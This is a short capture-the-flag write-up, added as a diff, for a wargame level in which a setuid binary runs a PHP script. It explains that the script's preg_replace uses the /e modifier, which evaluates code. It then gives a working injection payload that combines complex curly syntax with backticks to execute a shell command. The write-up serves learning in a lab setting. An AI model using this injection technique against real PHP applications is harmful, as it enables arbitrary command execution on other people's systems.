@@ -1,0 +1,16 @@
+This time, we have a php script and an executable
+`strace level06` give us:
+	...
+	setresgid32(2006, 2006, 2006)           = 0
+	setresuid32(2006, 2006, 2006)           = 0
+	execve("/usr/bin/php", ["/usr/bin/php", "/home/user/level06/level06.php", "", ""], [/* 20 vars */]) = 0
+	...
+Seems like we need to to launch our own code inside level06.php
+level06.php take $argv[1] and apply some `preg_replace` on it
+This one :
+	`preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`
+apply the '/e' modifier, allowing PHP to eval the second argument
+
+echo -e '[x ${`/bin/getflag`}]' > /tmp/level06 && ./level06
+` expr ` mean shell_exec('expr')
+${ } is the complex curly syntax, allowing us to evaluate complex expression inside a string
